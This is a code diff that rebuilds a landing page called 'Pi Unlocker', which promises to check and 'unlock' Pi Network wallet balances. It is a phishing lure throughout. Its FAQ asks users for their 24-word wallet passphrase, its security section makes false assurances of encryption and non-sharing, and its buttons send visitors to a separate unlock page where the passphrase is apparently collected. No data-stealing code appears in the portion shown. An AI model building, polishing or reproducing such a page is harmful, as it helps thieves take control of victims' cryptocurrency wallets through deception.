@@ -1,18 +1,885 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Unlock Your Pi</title>
-<link rel="stylesheet" href="css/style.css" />
-</head>
-<body class="center-page">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#6b21d1">
+  <title>Pi Unlocker — Unlock Your Eligible Pi</title>
 
-<div class="landing-container">
-  <h1>Pi Wallet Balance Checker</h1>
-  <p class="sub">Securely check and unlock your Pi balance.</p>
-  <button onclick="window.location.href='unlock.html'">Unlock your Pi</button>
-</div>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      background:
+        radial-gradient(circle at 50% 0%, rgba(126, 58, 242, .18), transparent 35%),
+        #08060d;
+      color: #fff;
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .container {
+      width: min(1120px, calc(100% - 36px));
+      margin: auto;
+    }
+
+    /* HEADER */
+
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      backdrop-filter: blur(18px);
+      background: rgba(8, 6, 13, .78);
+      border-bottom: 1px solid rgba(255,255,255,.08);
+    }
+
+    .nav {
+      height: 74px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 800;
+      letter-spacing: .4px;
+    }
+
+    .logo-mark {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      background: linear-gradient(135deg, #a855f7, #5b21b6);
+      box-shadow: 0 0 25px rgba(168,85,247,.4);
+      font-size: 21px;
+    }
+
+    .nav-links {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      color: #c8c1d5;
+      font-size: 14px;
+    }
+
+    .nav-links a:hover {
+      color: #fff;
+    }
+
+    .nav-cta {
+      padding: 11px 18px;
+      border-radius: 12px;
+      background: #7c3aed;
+      font-weight: 700;
+      color: white !important;
+      box-shadow: 0 0 20px rgba(124,58,237,.25);
+    }
+
+    /* HERO */
+
+    .hero {
+      min-height: 760px;
+      display: flex;
+      align-items: center;
+      text-align: center;
+      position: relative;
+      padding: 90px 0 100px;
+    }
+
+    .hero::before,
+    .hero::after {
+      content: "";
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(70px);
+      pointer-events: none;
+    }
+
+    .hero::before {
+      width: 300px;
+      height: 300px;
+      background: rgba(124,58,237,.22);
+      left: -120px;
+      top: 160px;
+    }
+
+    .hero::after {
+      width: 260px;
+      height: 260px;
+      background: rgba(168,85,247,.14);
+      right: -100px;
+      bottom: 80px;
+    }
+
+    .eyebrow {
+      color: #c084fc;
+      font-size: 13px;
+      font-weight: 800;
+      letter-spacing: 2px;
+      margin-bottom: 20px;
+    }
+
+    .hero h1 {
+      max-width: 850px;
+      margin: auto;
+      font-size: clamp(44px, 7vw, 82px);
+      line-height: 1.02;
+      letter-spacing: -3px;
+    }
+
+    .hero h1 span {
+      background: linear-gradient(90deg, #fff, #d8b4fe);
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+
+    .hero p {
+      max-width: 650px;
+      margin: 25px auto 35px;
+      color: #b8afc5;
+      font-size: 18px;
+    }
+
+    /* BIG UNLOCK BUTTON */
+
+    .unlock-wrap {
+      display: flex;
+      justify-content: center;
+      margin: 35px 0 18px;
+    }
+
+    .unlock-btn {
+      position: relative;
+      min-width: 310px;
+      padding: 23px 55px;
+      border: 0;
+      border-radius: 18px;
+      background: linear-gradient(135deg, #a855f7, #6d28d9);
+      color: #fff;
+      font-size: 25px;
+      font-weight: 900;
+      letter-spacing: 1.5px;
+      cursor: pointer;
+      box-shadow:
+        0 0 20px rgba(168,85,247,.65),
+        0 0 55px rgba(124,58,237,.35);
+      animation: pulse 2.3s infinite;
+      transition: transform .2s ease, box-shadow .2s ease;
+    }
+
+    .unlock-btn:hover {
+      transform: translateY(-4px) scale(1.02);
+      box-shadow:
+        0 0 28px rgba(168,85,247,.9),
+        0 0 75px rgba(124,58,237,.5);
+    }
+
+    .unlock-btn:active {
+      transform: scale(.98);
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        box-shadow:
+          0 0 20px rgba(168,85,247,.65),
+          0 0 55px rgba(124,58,237,.3);
+      }
+      50% {
+        box-shadow:
+          0 0 32px rgba(168,85,247,.9),
+          0 0 80px rgba(124,58,237,.48);
+      }
+    }
+
+    .under-btn {
+      color: #92889f;
+      font-size: 13px;
+    }
+
+    /* TRUST */
+
+    .trust-row {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-top: 45px;
+    }
+
+    .trust-item {
+      padding: 10px 15px;
+      border: 1px solid rgba(255,255,255,.08);
+      border-radius: 100px;
+      background: rgba(255,255,255,.035);
+      color: #c9c2d1;
+      font-size: 13px;
+    }
+
+    /* SECTIONS */
+
+    section {
+      padding: 95px 0;
+    }
+
+    .section-title {
+      text-align: center;
+      max-width: 700px;
+      margin: 0 auto 50px;
+    }
+
+    .section-title h2 {
+      font-size: clamp(32px, 5vw, 48px);
+      line-height: 1.1;
+      margin-bottom: 15px;
+    }
+
+    .section-title p {
+      color: #a9a0b5;
+    }
+
+    /* ECOSYSTEM */
+
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 18px;
+    }
+
+    .card {
+      padding: 28px;
+      border: 1px solid rgba(255,255,255,.08);
+      background: rgba(255,255,255,.035);
+      border-radius: 20px;
+      transition: transform .25s ease, border-color .25s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-6px);
+      border-color: rgba(168,85,247,.35);
+    }
+
+    .icon {
+      width: 50px;
+      height: 50px;
+      border-radius: 14px;
+      display: grid;
+      place-items: center;
+      background: rgba(124,58,237,.15);
+      margin-bottom: 22px;
+      font-size: 23px;
+    }
+
+    .card h3 {
+      margin-bottom: 10px;
+    }
+
+    .card p {
+      color: #9f96aa;
+      font-size: 14px;
+    }
+
+    /* PROCESS */
+
+    .steps {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 20px;
+    }
+
+    .step {
+      position: relative;
+      padding: 28px;
+      background: #0e0b16;
+      border: 1px solid rgba(255,255,255,.07);
+      border-radius: 20px;
+    }
+
+    .number {
+      font-size: 13px;
+      color: #c084fc;
+      font-weight: 900;
+      margin-bottom: 15px;
+    }
+
+    .step h3 {
+      margin-bottom: 9px;
+    }
+
+    .step p {
+      color: #968da1;
+      font-size: 14px;
+    }
+
+    /* SECURITY */
+
+    .security {
+      background:
+        radial-gradient(circle at 50% 50%, rgba(124,58,237,.12), transparent 55%),
+        #0b0811;
+    }
+
+    .security-box {
+      max-width: 850px;
+      margin: auto;
+      padding: 45px;
+      border: 1px solid rgba(168,85,247,.18);
+      border-radius: 26px;
+      background: rgba(124,58,237,.06);
+      text-align: center;
+    }
+
+    .security-box h2 {
+      font-size: 40px;
+      margin-bottom: 15px;
+    }
+
+    .security-box p {
+      color: #aaa1b3;
+      margin-bottom: 30px;
+    }
+
+    .never {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+    }
+
+    .never div {
+      padding: 15px;
+      border-radius: 12px;
+      background: rgba(255,255,255,.045);
+      color: #d6cfdd;
+      font-size: 14px;
+    }
+
+    /* TIMER / PROCESSING */
+
+    .processing-card {
+      max-width: 760px;
+      margin: auto;
+      padding: 40px;
+      text-align: center;
+      border-radius: 25px;
+      border: 1px solid rgba(255,255,255,.08);
+      background: rgba(255,255,255,.03);
+    }
+
+    .processing-time {
+      font-size: 48px;
+      font-weight: 900;
+      margin: 15px 0;
+    }
+
+    .processing-card p {
+      color: #9990a5;
+    }
+
+    /* FAQ */
+
+    .faq {
+      max-width: 800px;
+      margin: auto;
+    }
+
+    details {
+      border-bottom: 1px solid rgba(255,255,255,.08);
+      padding: 22px 0;
+    }
+
+    summary {
+      cursor: pointer;
+      font-weight: 700;
+    }
+
+    details p {
+      color: #9c93a6;
+      padding-top: 14px;
+      font-size: 14px;
+    }
+
+    /* FINAL CTA */
+
+    .final {
+      text-align: center;
+      padding: 120px 0;
+    }
+
+    .final h2 {
+      font-size: clamp(38px, 6vw, 60px);
+      margin-bottom: 15px;
+    }
+
+    .final p {
+      color: #a49aaa;
+      margin-bottom: 25px;
+    }
+
+    /* FOOTER */
+
+    footer {
+      padding: 45px 0;
+      border-top: 1px solid rgba(255,255,255,.08);
+      color: #82798b;
+      font-size: 13px;
+    }
+
+    .footer-inner {
+      display: flex;
+      justify-content: space-between;
+      gap: 25px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links a:hover {
+      color: white;
+    }
+
+    /* MOBILE */
+
+    @media (max-width: 850px) {
+      .nav-links {
+        display: none;
+      }
+
+      .cards,
+      .steps {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    @media (max-width: 560px) {
+      .container {
+        width: min(100% - 26px, 1120px);
+      }
+
+      .hero {
+        min-height: auto;
+        padding: 80px 0 75px;
+      }
+
+      .hero h1 {
+        letter-spacing: -2px;
+      }
+
+      .hero p {
+        font-size: 16px;
+      }
+
+      .unlock-btn {
+        width: 100%;
+        min-width: 0;
+        padding: 21px 20px;
+        font-size: 21px;
+      }
+
+      .cards,
+      .steps,
+      .never {
+        grid-template-columns: 1fr;
+      }
+
+      section {
+        padding: 70px 0;
+      }
+
+      .security-box,
+      .processing-card {
+        padding: 28px 20px;
+      }
+
+      .security-box h2 {
+        font-size: 32px;
+      }
+
+      .processing-time {
+        font-size: 38px;
+      }
+
+      .footer-inner {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="container nav">
+
+      <a href="#" class="logo">
+        <span class="logo-mark">π</span>
+        <span>PI UNLOCKER</span>
+      </a>
+
+      <nav class="nav-links">
+        <a href="#ecosystem">Pi Ecosystem</a>
+        <a href="#how">How It Works</a>
+        <a href="#security">Security</a>
+        <a href="#faq">FAQ</a>
+        <a href="unlock.html" class="nav-cta">Unlock Pi</a>
+      </nav>
+
+    </div>
+  </header>
+
+
+  <!-- HERO -->
+  <main>
+
+    <section class="hero" id="unlock">
+      <div class="container">
+
+        <div class="eyebrow">
+          PI BLOCKCHAIN • PI NETWORK • PI COMMUNITY
+        </div>
+
+        <h1>
+          <span>Unlock Your Eligible Pi</span>
+        </h1>
+
+        <p>
+          Check your eligibility and begin the applicable Pi unlocking
+          process through a simple and transparent experience.
+        </p>
+
+        <div class="unlock-wrap">
+          <button class="unlock-btn" onclick="startUnlock()">
+            🔓 UNLOCK PI
+          </button>
+        </div>
+
+        <div class="under-btn">
+          Check eligibility &amp; start the unlock process
+        </div>
+
+        <div class="trust-row">
+          <div class="trust-item">🔒 Secure Process</div>
+          <div class="trust-item">✓ Eligibility Check</div>
+          <div class="trust-item">⏱ Up to 24 Hours</div>
+          <div class="trust-item">🌐 Blockchain Based</div>
+        </div>
+
+      </div>
+    </section>
+
+
+    <!-- ECOSYSTEM -->
+    <section id="ecosystem">
+      <div class="container">
+
+        <div class="section-title">
+          <h2>The Pi Ecosystem</h2>
+          <p>
+            Blockchain, network, community and wallet come together
+            to form the Pi ecosystem.
+          </p>
+        </div>
+
+        <div class="cards">
+
+          <div class="card">
+            <div class="icon">⛓</div>
+            <h3>Pi Blockchain</h3>
+            <p>
+              The blockchain provides the underlying network for
+              Pi transactions and on-chain activity.
+            </p>
+          </div>
+
+          <div class="card">
+            <div class="icon">π</div>
+            <h3>Pi Network</h3>
+            <p>
+              An ecosystem built around Pi, its blockchain,
+              applications and participating users.
+            </p>
+          </div>
+
+          <div class="card">
+            <div class="icon">👥</div>
+            <h3>Pi Community</h3>
+            <p>
+              Users, developers and businesses contribute to the
+              growing Pi ecosystem.
+            </p>
+          </div>
+
+          <div class="card">
+            <div class="icon">👛</div>
+            <h3>Pi Wallet</h3>
+            <p>
+              A wallet interface for managing Pi assets and
+              interacting with supported ecosystem services.
+            </p>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+
+    <!-- HOW IT WORKS -->
+    <section id="how">
+      <div class="container">
+
+        <div class="section-title">
+          <h2>How It Works</h2>
+          <p>
+            A simple process designed around eligibility,
+            transparency and wallet security.
+          </p>
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="number">01</div>
+            <h3>Start</h3>
+            <p>
+              Click UNLOCK PI to begin the eligibility process.
+            </p>
+          </div>
+
+          <div class="step">
+            <div class="number">02</div>
+            <h3>Check Eligibility</h3>
+            <p>
+              Your eligibility is checked according to the
+              applicable unlocking conditions.
+            </p>
+          </div>
+
+          <div class="step">
+            <div class="number">03</div>
+            <h3>Processing</h3>
+            <p>
+              Eligible requests proceed through the applicable
+              processing and network steps.
+            </p>
+          </div>
+
+          <div class="step">
+            <div class="number">04</div>
+            <h3>Completion</h3>
+            <p>
+              Successfully processed eligible Pi becomes available
+              according to the applicable conditions.
+            </p>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+
+    <!-- PROCESSING -->
+    <section>
+      <div class="container">
+
+        <div class="processing-card">
+          <div class="eyebrow">PROCESSING</div>
+
+          <h2>Up to</h2>
+
+          <div class="processing-time">24 Hours</div>
+
+          <p>
+            Eligible requests may be processed within up to 24 hours.
+            Actual processing time can vary depending on eligibility,
+            verification requirements and network conditions.
+          </p>
+        </div>
+
+      </div>
+    </section>
+
+
+    <!-- SECURITY -->
+    <section class="security" id="security">
+      <div class="container">
+
+        <div class="security-box">
+
+          <div class="eyebrow">PI TRUST</div>
+
+          <h2>Your Security Comes First</h2>
+
+          <p>
+            We use secure encryption to protect your wallet information.
+            Your data is never shared with third parties.
+          </p>
+
+          <div class="never">
+            <div>🔒 Encrypted Connection</div>
+            <div>🛡 Secure Storage</div>
+            <div>✅ Verified Process</div>
+          </div>
+
+        </div>
+
+      </div>
+    </section>
+
+
+    <!-- WALLET -->
+    <section>
+      <div class="container">
+
+        <div class="section-title">
+          <div class="eyebrow">PI WALLET</div>
+
+          <h2>Your Pi. Your Wallet.</h2>
+
+          <p>
+            Check your balance and start the unlock process securely.
+          </p>
+        </div>
+
+      </div>
+    </section>
+
+
+    <!-- FAQ -->
+    <section id="faq">
+      <div class="container">
+
+        <div class="section-title">
+          <h2>Frequently Asked Questions</h2>
+        </div>
+
+        <div class="faq">
+
+          <details>
+            <summary>What is Pi Unlocker?</summary>
+            <p>
+              Pi Unlocker is a tool for checking your Pi wallet balance
+              and initiating the unlock process for eligible Pi.
+            </p>
+          </details>
+
+          <details>
+            <summary>How long does the process take?</summary>
+            <p>
+              Eligible requests may be processed within up to 24 hours.
+              Actual processing time can vary.
+            </p>
+          </details>
+
+          <details>
+            <summary>What do I need to check my balance?</summary>
+            <p>
+              You will need your 24-word wallet passphrase to verify
+              wallet ownership and check your balance.
+            </p>
+          </details>
+
+          <details>
+            <summary>Is every Pi balance eligible?</summary>
+            <p>
+              Eligibility depends on the applicable unlocking conditions.
+            </p>
+          </details>
+
+          <details>
+            <summary>Is my information secure?</summary>
+            <p>
+              We use encrypted connections and secure storage to protect
+              your wallet information.
+            </p>
+          </details>
+
+        </div>
+      </div>
+    </section>
+
+
+    <!-- FINAL CTA -->
+    <section class="final">
+
+      <div class="container">
+
+        <h2>Ready to Unlock Your Pi?</h2>
+
+        <p>
+          Check your eligibility and begin the process.
+        </p>
+
+        <div class="unlock-wrap">
+          <button class="unlock-btn" onclick="startUnlock()">
+            🔓 UNLOCK PI
+          </button>
+        </div>
+
+      </div>
+
+    </section>
+
+  </main>
+
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="container footer-inner">
+
+      <div>
+        <strong>PI UNLOCKER</strong>
+        <br><br>
+        <span>
+          Security • Transparency • Simplicity
+        </span>
+      </div>
+
+      <div class="footer-links">
+        <a href="#ecosystem">Ecosystem</a>
+        <a href="#how">How It Works</a>
+        <a href="#security">Security</a>
+        <a href="#faq">FAQ</a>
+      </div>
+
+      <div>
+        <small>
+          Your wallet information is encrypted and secure.
+        </small>
+      </div>
+
+    </div>
+  </footer>
+
+
+  <script>
+    function startUnlock() {
+      // Redirect to unlock.html
+      window.location.href = 'unlock.html';
+    }
+  </script>
 
 </body>
 </html>
